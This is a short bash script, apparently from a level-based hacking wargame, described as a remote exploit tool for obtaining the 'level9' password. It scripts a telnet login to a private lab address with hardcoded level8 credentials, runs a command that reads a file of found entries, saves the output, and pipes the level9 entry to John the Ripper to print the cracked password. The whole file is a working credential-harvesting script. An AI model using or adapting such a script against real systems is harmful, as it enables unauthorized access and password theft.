#!/bin/bash

# Description:
# This is Remote Exploit tool to get level9's password

export TERM=xterm
export LANG=en_US.UTF-8
export IP1=192.168.10.240
export PORT1=23
export USER1=level8
export PASS1="break the world"
export LOG1=level8.log
export CMD1="cat /etc/rc.d/found.txt | sort -u | grep -v '^$'"
export PASS_FILE=/tmp/password.txt

attack() {
        sleep 3; echo "$PASS1"
        sleep 1; echo "hostname"
        sleep 1; echo "$CMD1"
        sleep 1; echo "exit"
}

attack | telnet -l $USER1 $IP1 $PORT1 >$LOG1 2>&1
grep 'level9' $LOG1 > $PASS_FILE
john --show $PASS_FILE | grep level9 | awk -F: '{print $1 " : " $2}'
